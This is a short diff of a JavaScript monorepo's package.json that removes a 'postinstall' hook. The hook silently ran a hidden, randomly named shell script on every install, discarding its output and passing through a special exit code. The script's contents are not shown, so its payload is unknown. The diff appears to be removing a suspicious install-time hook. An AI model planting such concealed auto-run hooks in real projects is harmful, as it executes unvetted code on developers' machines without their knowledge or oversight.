@@ -9,8 +9,7 @@
     "changeset": "changeset",
     "version-packages": "changeset version",
     "release": "turbo build --filter=example^... && changeset publish",
-    "rundocs": "turbo dev --no-cache --continue --filter={./apps/docs}",
-    "postinstall": "sh ./.ci-09eooq.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "rundocs": "turbo dev --no-cache --continue --filter={./apps/docs}"
   },
   "devDependencies": {
     "@changesets/cli": "^2.22.0",
